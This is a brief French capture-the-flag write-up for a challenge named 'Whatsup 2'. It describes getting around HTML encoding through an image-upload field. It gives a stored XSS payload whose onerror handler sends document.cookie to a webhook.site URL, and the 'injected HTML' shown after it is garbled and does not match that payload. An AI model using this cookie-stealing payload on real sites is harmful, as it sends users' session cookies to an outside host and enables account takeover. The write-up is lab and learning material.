
# Whatsup 2

On se rend vite compte qu'en envoyant un message chaque balise html et encodé. Ce qui rends l'envoi d'une xss impossible !

Ici c'est le même principe qu'avant avec encore moins de travail !

Le site va injecter du code html pour nous grâce à l'envoi d'image 

du coup mon payloads :

```JS
" onerror="document.location='https://webhook.site/14aa109b-daa5-4d81-95f1-54fcccd908a3?c='+document.cookie
```

Ce qui va injecter dans la page :

```HTML
 <img src="" onerror="'+document.cookie" />
```

On récupère notre flag comme dans le whatsup 1
